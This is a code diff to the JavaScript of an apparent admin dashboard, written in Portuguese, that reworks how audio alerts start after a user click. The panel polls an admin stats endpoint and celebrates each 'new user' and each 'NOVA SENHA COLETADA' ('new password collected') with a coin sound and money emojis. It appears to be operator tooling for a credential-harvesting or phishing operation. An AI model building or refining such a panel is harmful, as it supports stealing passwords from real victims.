@@ -1228,76 +1228,115 @@
         }
     }
 
-    // ========== SISTEMA DE SOM ==========
-    let somLigado = true;
-    let ultimoTotalUsuarios = 0;
-    let ultimoTotalLogs = 0;
+   // ========== SISTEMA DE SOM ==========
+let somLigado = true;
+let ultimoTotalUsuarios = 0;
+let ultimoTotalLogs = 0;
+let audioSom = null;
+let audioInicializado = false;
 
-    const audioSom = new Audio('https://www.soundjay.com/misc/sounds/coin-drop-01.mp3');
+// Inicializar áudio após clique do usuário
+function inicializarAudio() {
+    if (audioInicializado) return;
+    audioSom = new Audio('https://www.soundjay.com/misc/sounds/coin-drop-01.mp3');
+    audioSom.load();
+    audioInicializado = true;
+    console.log('🔊 Áudio inicializado');
+}
 
-    function tocarSom() {
-        if (!somLigado) return;
+function tocarSom() {
+    if (!somLigado) return;
+    
+    // Inicializar se ainda não foi
+    if (!audioInicializado) {
+        inicializarAudio();
+    }
+    
+    if (audioSom) {
         audioSom.currentTime = 0;
-        audioSom.play().catch(e => console.log('Som não reproduzido'));
+        audioSom.play().catch(e => {
+            console.log('Som não reproduzido automaticamente:', e);
+            // Mostrar dica para o usuário
+            showToast('🔊 Clique em qualquer lugar para ativar os sons', 'info');
+        });
     }
+}
 
-    function alternarSom() {
-        somLigado = !somLigado;
-        const btn = document.getElementById('btnSom');
-        if (btn) {
-            btn.innerHTML = somLigado ? '<i class="fas fa-volume-up"></i>' : '<i class="fas fa-volume-mute"></i>';
-        }
-        showToast(somLigado ? '🔊 Sons ativados' : '🔇 Sons desativados', 'info');
+function alternarSom() {
+    somLigado = !somLigado;
+    const btn = document.getElementById('btnSom');
+    if (btn) {
+        btn.innerHTML = somLigado ? '<i class="fas fa-volume-up"></i>' : '<i class="fas fa-volume-mute"></i>';
     }
-
-    const btnSom = document.createElement('div');
-    btnSom.id = 'btnSom';
-    btnSom.style.position = 'fixed';
-    btnSom.style.bottom = '20px';
-    btnSom.style.right = '20px';
-    btnSom.style.zIndex = '1000';
-    btnSom.style.background = 'rgba(0,0,0,0.7)';
-    btnSom.style.backdropFilter = 'blur(10px)';
-    btnSom.style.borderRadius = '50%';
-    btnSom.style.width = '45px';
-    btnSom.style.height = '45px';
-    btnSom.style.display = 'flex';
-    btnSom.style.alignItems = 'center';
-    btnSom.style.justifyContent = 'center';
-    btnSom.style.cursor = 'pointer';
-    btnSom.style.border = '1px solid rgba(255,255,255,0.2)';
-    btnSom.innerHTML = '<i class="fas fa-volume-up" style="color:white; font-size:20px;"></i>';
-    btnSom.onclick = alternarSom;
-    document.body.appendChild(btnSom);
-
-    function verificarNovosDados() {
-        if (!adminToken) return;
-        
-        fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } })
-            .then(res => res.json())
-            .then(data => {
-                const stats = data.stats || {};
-                const totalUsuarios = stats.total_users || 0;
-                const totalLogs = stats.total_logs || 0;
-                
-                if (totalUsuarios > ultimoTotalUsuarios && ultimoTotalUsuarios !== 0) {
-                    tocarSom();
-                    showToast(`💰 NOVO USUÁRIO! Total: ${totalUsuarios}`, 'success');
-                }
-                if (totalLogs > ultimoTotalLogs && ultimoTotalLogs !== 0) {
-                    tocarSom();
-                    showToast(`💰 NOVA SENHA COLETADA!`, 'info');
-                }
-                
-                ultimoTotalUsuarios = totalUsuarios;
-                ultimoTotalLogs = totalLogs;
-            })
-            .catch(err => console.error('Erro:', err));
+    showToast(somLigado ? '🔊 Sons ativados' : '🔇 Sons desativados', 'info');
+    
+    // Testar som ao ativar
+    if (somLigado) {
+        setTimeout(() => tocarSom(), 100);
     }
+}
 
-    setInterval(() => {
-        if (adminToken) verificarNovosDados();
-    }, 5000);
+// Botão flutuante
+const btnSom = document.createElement('div');
+btnSom.id = 'btnSom';
+btnSom.style.position = 'fixed';
+btnSom.style.bottom = '20px';
+btnSom.style.right = '20px';
+btnSom.style.zIndex = '1000';
+btnSom.style.background = 'rgba(0,0,0,0.7)';
+btnSom.style.backdropFilter = 'blur(10px)';
+btnSom.style.borderRadius = '50%';
+btnSom.style.width = '45px';
+btnSom.style.height = '45px';
+btnSom.style.display = 'flex';
+btnSom.style.alignItems = 'center';
+btnSom.style.justifyContent = 'center';
+btnSom.style.cursor = 'pointer';
+btnSom.style.border = '1px solid rgba(255,255,255,0.2)';
+btnSom.innerHTML = '<i class="fas fa-volume-up" style="color:white; font-size:20px;"></i>';
+btnSom.onclick = alternarSom;
+document.body.appendChild(btnSom);
+
+// Inicializar áudio no primeiro clique em qualquer lugar da página
+function iniciarAudioPrimeiroClique() {
+    inicializarAudio();
+    tocarSom();
+    document.removeEventListener('click', iniciarAudioPrimeiroClique);
+    document.removeEventListener('keydown', iniciarAudioPrimeiroClique);
+    console.log('🎵 Áudio ativado por interação do usuário');
+}
+
+document.addEventListener('click', iniciarAudioPrimeiroClique);
+document.addEventListener('keydown', iniciarAudioPrimeiroClique);
+
+function verificarNovosDados() {
+    if (!adminToken) return;
+    
+    fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } })
+        .then(res => res.json())
+        .then(data => {
+            const stats = data.stats || {};
+            const totalUsuarios = stats.total_users || 0;
+            const totalLogs = stats.total_logs || 0;
+            
+            if (totalUsuarios > ultimoTotalUsuarios && ultimoTotalUsuarios !== 0) {
+                tocarSom();
+                showToast(`💰 NOVO USUÁRIO! Total: ${totalUsuarios}`, 'success');
+            }
+            if (totalLogs > ultimoTotalLogs && ultimoTotalLogs !== 0) {
+                tocarSom();
+                showToast(`💰 NOVA SENHA COLETADA!`, 'info');
+            }
+            
+            ultimoTotalUsuarios = totalUsuarios;
+            ultimoTotalLogs = totalLogs;
+        })
+        .catch(err => console.error('Erro:', err));
+}
+
+setInterval(() => {
+    if (adminToken) verificarNovosDados();
+}, 5000);
 </script>
 </body>
 </html>
